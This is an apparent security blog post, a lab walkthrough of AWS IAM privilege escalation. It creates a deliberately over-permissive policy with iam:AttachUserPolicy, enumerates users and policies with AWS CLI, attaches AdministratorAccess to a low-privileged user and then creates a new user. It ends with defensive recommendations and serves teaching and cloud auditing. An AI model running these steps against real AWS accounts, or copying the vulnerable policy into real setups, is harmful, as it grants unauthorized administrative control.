@@ -1,0 +1,150 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/cloud-security/" rel="category tag">Cloud Security</a></span>            </div>
+            <h1 class="post-title entry-title">AWS: IAM AttachUserPolicy Abuse</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/aws-iam-attachuserpolicy-abuse/" rel="bookmark"><time class="entry-date published" datetime="2025-07-26T12:49:18+00:00">July 26, 2025</time><time class="updated" datetime="2025-07-26T15:01:43+00:00">July 26, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Cloud computing provides many advantages but also introduces security risks, such as service abuse and IAM policy misconfigurations. Specifically, the ability to attach user policies in cloud environments when dealing with managed service providers. </span><span style="color: #000000;">This lab demonstrates the abuse of the <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_AttachUserPolicy.html"><strong>AttachUserPolicy</strong></a></span> IAM permission, which attaches the specified managed policy to the specified IAM user. With this permission, a user can escalate their own privileges or those of others by assigning high-level access policies.<strong>             </strong></span></p>
+<h3><span style="color: #800000;">Table Of Contents</span></h3>
+<p><span style="color: #000000;"><strong>About IAM AttachUserPolicy</strong></span></p>
+<p><span style="color: #000000;"><strong>Lab Setup and Prerequisite</strong></span></p>
+<p><span style="color: #000000;"><strong>Part 1: IAM Lab Setup</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Creating an Overly Permissive Policy</span></li>
+<li><span style="color: #000000;">Creating an IAM user with permissive Policy Assignment</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Part 2: Enumeration and Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Use Case Scenario for AttachUserPolicy</span></li>
+<li><span style="color: #000000;">Set up &amp; Enumeration of profile using AWS CLI</span></li>
+<li><span style="color: #000000;">IAM AttachUserPolicy Privilege Escalation</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Analysis</strong></span></p>
+<p><span style="color: #000000;"><strong>Recommendations </strong></span></p>
+<p><span style="color: #000000;"><strong>Conclusion</strong></span></p>
+<h3><span style="color: #800000;">About iam: AttachUserPolicy</span></h3>
+<p><span style="color: #000000;">A user with iam:AttachUserPolicy can attach powerful managed policies like AdministratorAccess to themselves or others. Without resource restrictions, this can lead to privilege escalation and full administrative access over the AWS environment. For more information about policies, see <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/policies-managed-vs-inline.html">Managed policies and inline policies</a></span></strong> in the <em>IAM User Guide.</em></span></p>
+<h3><span style="color: #800000;">Lab Setup and Prerequisites:</span></h3>
+<ol>
+<li><span style="color: #000000;">An AWS Account</span></li>
+<li><span style="color: #000000;">VM Kali Linux</span></li>
+</ol>
+<p><span style="color: #000000;">If you are new to AWS platform, it is recommended to go through the AWS Lab setup <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/aws-penetration-testing-lab-setup/">here</a></span></strong>.<strong> </strong></span></p>
+<h3><span style="color: #800000;">Part 1: IAM Lab Setup</span></h3>
+<p><span style="color: #000000;">Here are the instructions for setting up the environment. We will access the AWS console and configure the AWS Command Line Interface (CLI).</span></p>
+<p><span style="color: #000000;"><strong>User:</strong></span></p>
+<p><span style="color: #000000;">Igt_komal</span></p>
+<p><span style="color: #000000;"><strong>Policy name:</strong></span></p>
+<p><span style="color: #000000;">Vuln_attached_policy</span></p>
+<h4><span style="color: #800000;">Creating an Overly Permissive Policy</span></h4>
+<h5><span style="color: #000000;">To set the managed policy</span></h5>
+<ol>
+<li><span style="color: #000000;">Navigate to <strong>IAM &gt; Policies</strong> <strong>&gt;</strong> <strong>Create policy</strong>.</span></li>
+</ol>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibjEth6qqTKhF7d-eyyux4YUXJabrfcrs0O88EFIkbHTxcNgEZVMIfmHnxDAbVlpNwXT9v6WcQfpG8mPqnSoITaSBdWZzivnSA7yduV9ucHMw3hRm7YW-JpisgtNZ28pwJfMBAJelMNvnEoR0FPsrl5qNeooPc_Sz0ANDkWEffY6enm-BBKgGY3gjOxacU/s16000/1.png" alt="AWS IAM AttachUserPolicy" width="871" height="433"/></span></p>
+<ol start="2">
+<li><span style="color: #000000;">Specify permissions on the Policy Editor. Write a custom policy which grants the full administrative permissions and later it will be used as an <strong>escalation path.</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;"><strong>Effect</strong>: Allow -&gt; Grants permissions, not denying.</span></li>
+<li><span style="color: #000000;"><strong>Resource</strong>: “*” -&gt; Applies to all resources in the account.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>      Actions:</strong></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>iam:List *</strong> – Lists IAM resources like users, roles, and policies.</span></li>
+<li><span style="color: #000000;"><strong>iam:Get *</strong> – Retrieves detailed information about IAM resources.</span></li>
+<li><span style="color: #000000;"><strong>iam:SimulatePrincipalPolicy</strong> – simulates IAM permissions to check what actions a principal can perform. (for auditing/testing)</span></li>
+<li><span style="color: #000000;"><strong>iam:AttachUserPolicy</strong> – Attaches managed policies to users, allowing privilege escalation if misused.</span></li>
+<li><span style="color: #000000;"><strong>iam:CreatePolicyVersion</strong> – Creates new versions of existing policies.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "iam:List*",
+        "iam:Get*",
+        "iam:SimulatePrincipalPolicy",
+        "iam:AttachUserPolicy"
+      ],
+      "Resource": "*"
+    },
+    {
+      "Effect": "Allow",
+      "Action": [
+        "iam:CreatePolicyVersion"
+      ],
+      "Resource": "arn:aws:iam::*: policy/vul_attached_policy"
+    }
+  ]
+}</pre>
+<p><span style="color: #000000;">This is how the policy appears on Policy editor.  Click <strong>Create policy </strong>after adding policy details such as name <strong>Vuln_attached_policy</strong> in step 2 as shown in the screenshot.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9Rndt4d8Iy1euoLgyTtxjUs_fMx7cnEFqEu-iyuDmVTkR9LofxVV9TsAVRigNZ1PakU5RWFuSL68nZXHPKMxKfz0_Oqr_osSpr5TwIiVvZNoij66MWnj9f0A3PVxtWUZvGm7gpa9nIzqWnsEdUiUTjETW9slAFVfvwsNEQPOf8N582kwakUHxx7vu5Enl/s16000/2.png"/></span></p>
+<h4><span style="color: #800000;">Creating an IAM user with permissive Policy Assignment</span></h4>
+<p><span style="color: #000000;">Go to <strong>IAM &gt; Users &gt; Create user</strong>. Enter the user details (e.g. Igt_komal) then choose <strong>Attach policies directly</strong> under<strong> Permissions options </strong>on Set permissions. Select <strong>Vuln_attached_policy</strong> from the list, then click <strong>Next</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidY2RWOf4vnchZ_c6i8xZ7LMjAQiOxgHGlw9sPmN047gz6RBV3ZhRZwgCN-C1RVcHQgKeZqcm_IuB8Kc_8solZ-zyLQDuAXOMw8b3vLjE8OcrGWIAkg8JtSXHD4c6A9n-BP2XDMrgtnOpFiFHj7Kb2kSL5eWaJyH3MFUMva7tNzlew3vzOa0zSd_oX3UST/s16000/3.png" alt="AWS IAM AttachUserPolicy" width="1320" height="662"/></span></p>
+<h3><span style="color: #800000;">Part 2: Enumeration and Exploitation</span></h3>
+<h4><span style="color: #800000;">Use Case Scenario for AttachUserPolicy</span></h4>
+<p><span style="color: #000000;">AttachUserPolicy directly associate managed IAM policies with a specific user. Though <strong>not ideal</strong> for large-scale or production use, they serve certain practical purposes during testing or controlled environments.</span></p>
+<p><span style="color: #000000;">This approach is often adopted for:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Testing or troubleshooting</strong> access issues</span></li>
+<li><span style="color: #000000;"><strong>Quickly granting permissions</strong> without modifying groups or roles</span></li>
+<li><span style="color: #000000;"><strong>Fine-grained control</strong> in small or isolated environments</span></li>
+</ul>
+<h4><span style="color: #800000;">Set up &amp; Enumeration of profile using AWS CLI</span></h4>
+<p><span style="color: #000000;">Firstly, Set up a profile named <strong>Igt_komal</strong> in AWS CLI.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws configure set profile.Igt_komal.aws_access_key_id AKI</pre>
+<p><span style="color: #000000;">Assigning the <strong>access key ID</strong>, <strong>secret access key</strong>, and default <strong>region</strong> for that profile. It will allow profile Igt_komal to act as the IAM user in future.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws configure set profile.Igt_komal.aws_secret_access_key W+ft
+aws configure set profile.Igt_komal.region us-east-1</pre>
+<p><span style="color: #000000;">The following command will retrieve the identity information (UserId, Account ID, ARN) for the currently authenticated user via that profile.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws sts get-caller-identity --profile Igt_komal</pre>
+<p><span style="color: #000000;">The command written below will list all managed policies attached to the user <strong>Igt_komal. </strong>The output clearly shows that the user has one attached policy i.e. vuln_attached_policy. Note the <strong>PolicyArn</strong> highlighted in the screenshot.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam list-attached-user-policies --user-name Igt_komal --profile Igt_komal</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPbAe9KRy2KxAiCGq5GD39mJaLAKp0cKt81QZTtYeM5r6byUWXRG6ApczWEVct1vREQa7AViZbpb3BE0fE2n1rRki4Aaid7ud8mWmNJcfYd1hK1etJZHXvaI6AxrvMkZX-FU3RiD5OX45buA3fRvET-lV-RlU9wZO919GtyP6d7v1ss4km3FQ08bOfVAi9/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Then, list all the available versions of the Vuln_attached_policy by the following command and the result clearly shows the version Id v1 is set as default i.e. its active version.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam list-policy-versions --policy-arn arn:aws:iam::513869214449:policy/vuln_attached_policy --profile Igt_komal</pre>
+<p><span style="color: #000000;">Running this command brings the full details of a specific version of the IAM policy like the Policy version, creation date etc.</span></p>
+<p><span style="color: #000000;">Note the output showing an overly permissive policy with wildcards (*) for both iam: List and iam:Get  along with iam:AttachUserPolicy. <strong>A privilege escalation risk.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam get-policy-version --policy-arn arn:aws:iam::513869214449:policy/vuln_attached_policy --version-id v1 --profile Igt_komal</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiW1-D-Q2ZziyCEzm5gTa_8gKQe9BgbdcVCaVmWyVT_y5L-97MyZ8n3ve1h01YHJ0WR-NvJhxn3Ud9zkKCcwsijBJPbsb32xYXoZaAK-YiiSxISNWx8DWbnuDTlMqmjv0FojdpplCbbvZPv3IRtfZrrFkvxIDBN_UyuQHWzzjOn0B7grXMINZoexe3XKBzx/s16000/5.png" alt="AWS IAM AttachUserPolicy" width="1349" height="828"/></span></p>
+<p><span style="color: #000000;">Next, run the following command to list IAM users. The output includes user names, IDs, and ARNs—highlighting <strong>Igt_admin</strong> as a potential <strong>target.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam list-users --profile Igt_komal</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8lYpz2u2LRsFiYWEmk3wYgj_Zj2GykN1lJHiLwefbekYrJanvxIw31X0e5Zbg3VqIDB1B1FuHWVKRqHTGby-tnYxWd-qURXslqtqCbSlzLlZcHJnz9hwwDKVJJpsGZtqKmgptzJ-cEsyKSSavM6iqFiROAGy1LLtDeGJ9vkhGSikMtSxcbUG_g04MmxUE/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Now, list the policies attached to admin_role by running the following command: The output shows AdministratorAccess.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam list-attached-user-policies --user-name Igt_admin --profile Igt_komal</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5ty_8jTwa49Z3yJUSnoazEjlcj_7T73jij7hNFOFLrSWkQs-NkzS72iG7SaWRNt_OtAbPZKxH9k0DiVr2cfVlxPvMx9vd6g5tjfCQCU9-iRcTrZVxYhW8IC-Ism9STEI34fLJ45tqL8E6ryyM6fKuzUB8RqORq0fQOJwU59FPbQIBdAiOOpn1N3YfbWIm/s16000/7.png"/></strong></span></p>
+<h4><span style="color: #800000;">IAM AttachUserPolicy Privilege Escalation</span></h4>
+<p><span style="color: #000000;">The real game begins with the execution of this command where Igt_komal tries to create another user Igt_hacker but the action is <strong>denied</strong> as no identity-based policy can do it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam create-user --user-name Igt_hacker --profile Igt_komal</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCVQE_tu12EGvtaQl4ZADhMzPWep98Ujt8kvorTk30uM11oQbwUV0FHpDO_xDBPa80r-cOUc8Hmz578i0W_MQU9c4_pXA-9DELw9CNPYv4aw2Yc2zYlfCyETGMM5dXL2mDJbSSl6M8nKSvEawKH-e57G7efivLrme55gkF-3_v1JdIaqHFGdx8DapfZ6Pm/s16000/8.png" alt="AWS IAM AttachUserPolicy" width="1195" height="255"/></span></p>
+<p><span style="color: #000000;">This command attaches the powerful AdministratorAccess managed policy to the IAM user Igt_komal.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam attach-user-policy --user-name Igt_komal --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile Igt_komal</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgg5OvRGop1ZALgfMz78b1hf0-a6ZXZj0z9Os_xjMmo2vrUO974VobmMrJaIeKFWlq2YuHaeH-ipQdHIhhOMYbJSGYA7_-ONSqKmqymlod0bxrmGG_7VPHydbYxqcBkitZAYYER7y6OfTdrSxqS2v6roKcRLqpBtObA84BuA2TSjoM1GWy4bMAlhde9wzQD/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Now, the execution of following command further confirms the the <strong>user’s AdministratorAccess, </strong>as the command shows all the policies attached to Igt_komal</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam list-attached-user-policies --user-name Igt_komal --profile Igt_komal</pre>
+<p><span style="color: #000000;">Again, try the following command and it’s a success this time around.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam create-user --user-name Igt_hacker --profile Igt_komal</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRDoCWHeU0KfxL4YJstCaS9lCPBL-eS8gwvIOo9mfu_6HfskFl8SZDr3wAuC4_bAJy6XrycCVWFFDOeJ1mjC0YVrhEfGt7uWHW2oR2KvqtCFohDkXrcQb9dvPC3BcGQwfzOpgag2yuFfqs7AfiwJ48ZevjvuUSiBP5YCa88Hfp8JLzJoVtuAuGyUFgSwcy/s16000/10.png" alt="AWS IAM AttachUserPolicy" width="1337" height="695"/></span></p>
+<p><span style="color: #000000;"><strong>Congratulations</strong>!! Privilege escalation via AttachUserPolicy abuse is demonstrated.</span></p>
+<h3><span style="color: #800000;">Analysis</span></h3>
+<p><span style="color: #000000;">The user Igt_komal has successfully escalated privileges from limited access to <strong>full administrative control</strong> over the AWS account by leveraging the iam:AttachUserPolicy permission- a classic IAM misconfiguration abuse. The escalation path was:</span></p>
+<p><strong><span style="color: #000000;">Low privileged IAM User → Attach AdministratorAccess via iam:AttachUserPolicy → Full Admin Privileges → AWS Account Compromise</span></strong></p>
+<h3><span style="color: #800000;">Recommendations </span></h3>
+<ul>
+<li><span style="color: #000000;">Avoid granting users permissions like iam:AttachUserPolicy unless absolutely necessary.</span></li>
+<li><span style="color: #000000;">Assign permissions via roles or groups instead of direct user attachments.</span></li>
+<li><span style="color: #000000;"><strong>Immediately detach high-privilege policies</strong> from low-privileged users</span></li>
+<li><span style="color: #000000;">Use AWS CloudTrail + Amazon CloudWatch to create alerts on privilege escalation events.</span></li>
+<li><span style="color: #000000;">Schedule periodic IAM audits to detect unused or risky policies.</span></li>
+</ul>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">This lab exercise represents a critical security risk in AWS through misconfigured IAM permissions. This type of escalation does not rely on traditional vulnerabilities or exploits rather the poor permission boundaries can result in such compromise.</span></p>
+<p><span style="color: #000000;"><strong>Author: Fatima Aziz</strong> is an accomplished cybersecurity professional with expertise in cloud security, holding certifications like GPCS and CCSK. Contact Fatima Aziz on <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/fatimaaaziz/"><strong>LinkedIn</strong></a>.</span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
